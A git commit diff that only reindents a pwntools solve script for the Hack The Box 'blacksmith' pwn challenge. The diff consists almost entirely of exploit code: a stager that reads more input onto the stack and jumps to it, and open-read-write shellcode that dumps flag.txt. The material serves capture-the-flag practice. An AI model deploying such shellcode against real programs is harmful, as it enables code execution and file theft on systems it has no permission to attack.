3e34ed7131a7a60c03b171a283772d8d440afa94
one2blame <contactme@one2bla.me>
2021-04-22 22:11:13 -0400

    Second try at formatting

--- ctf/pwn/htb/easy/blacksmith/solve.py
+++ ctf/pwn/htb/easy/blacksmith/solve.py
@@ -11,43 +11,43 @@ splash()
 elf = context.binary = ELF(BINARY)
 
 STAGER = """
-        /* call read(0, rsp, 0xfff) */
-        xor rdi, rdi
-        sub rsp, 0xfff
-        lea rsi, [rsp]
-        mov rdx, 0xfff
-        xor rax, rax
-        syscall
-        jmp rsp
+    /* call read(0, rsp, 0xfff) */
+    xor rdi, rdi
+    sub rsp, 0xfff
+    lea rsi, [rsp]
+    mov rdx, 0xfff
+    xor rax, rax
+    syscall
+    jmp rsp
 """
 SHELLCODE = """
-        /* push b'flag.txt\x00' */
-        xor rbx, rbx
-        push rbx
-        mov rax, 0x7478742e67616c66
-        push rax
-        /* call open('rsp', 'O_RDONLY', 0) */
-        mov rax, 2
-        mov rdi, rsp
-        xor rsi, rsi /* O_RDONLY */
-        cdq /* rdx=0 */
-        syscall
-        /* call read(3, rsp, 0xfff) */
-		mov rdi, rax
-        sub rsp, 0xfff
-		lea rsi, [rsp]
-		mov rdx, 0xfff
-		xor rax, rax
-		syscall
-        /* call write(1, rsp, bytes_read) */
-        mov rdx, rax
-        mov rdi, 1
-        mov rax, 1
-        syscall
-        /* call exit(0) */
-        mov rax, 60
-        mov rdi, 0
-        syscall
+    /* push b'flag.txt\x00' */
+    xor rbx, rbx
+    push rbx
+    mov rax, 0x7478742e67616c66
+    push rax
+    /* call open('rsp', 'O_RDONLY', 0) */
+    mov rax, 2
+    mov rdi, rsp
+    xor rsi, rsi /* O_RDONLY */
+    cdq /* rdx=0 */
+    syscall
+    /* call read(3, rsp, 0xfff) */
+    mov rdi, rax
+    sub rsp, 0xfff
+    lea rsi, [rsp]
+    mov rdx, 0xfff
+    xor rax, rax
+    syscall
+    /* call write(1, rsp, bytes_read) */
+    mov rdx, rax
+    mov rdi, 1
+    mov rax, 1
+    syscall
+    /* call exit(0) */
+    mov rax, 60
+    mov rdi, 0
+    syscall
 """
 
 
